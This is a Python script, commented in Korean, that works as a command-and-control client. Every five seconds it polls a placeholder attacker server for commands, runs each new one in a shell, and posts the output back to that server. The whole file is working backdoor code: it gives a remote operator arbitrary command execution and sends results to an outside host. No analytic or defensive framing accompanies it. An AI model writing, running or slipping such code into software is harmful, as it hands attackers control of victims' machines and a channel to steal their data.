import time
import requests
import os
import subprocess

# 중앙 C&C 서버 URL
COMMAND_SERVER_URL = 'http://[attacker_server]/command.php'

def execute_command(command):
    try:
        print(f'Executing command: {command}')
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        send_result(result.stdout)
    except Exception as e:
        print(f'Error executing command: {e}')
        send_result(f'Error executing command: {e}')

def send_result(result):
    try:
        response = requests.post(COMMAND_SERVER_URL, data={'result': result})
        if response.status_code != 200:
            print(f'Failed to send result: {result}')
    except Exception as e:
        print(f'Error sending result: {e}')

def get_command():
    try:
        response = requests.get(COMMAND_SERVER_URL)
        if response.status_code == 200:
            return response.text.strip()
        else:
            print(f'Failed to retrieve command. Status code: {response.status_code}')
            return None
    except Exception as e:
        print(f'Error retrieving command: {e}')
        return None

if __name__ == "__main__":
    print('Started C&C client')
    last_command = None
    try:
        while True:
            command = get_command()
            if command and command != last_command and command != "No command.":
                execute_command(command)
                last_command = command
            time.sleep(5)  # 5초마다 명령을 확인
    except KeyboardInterrupt:
        print('Stopped C&C client')
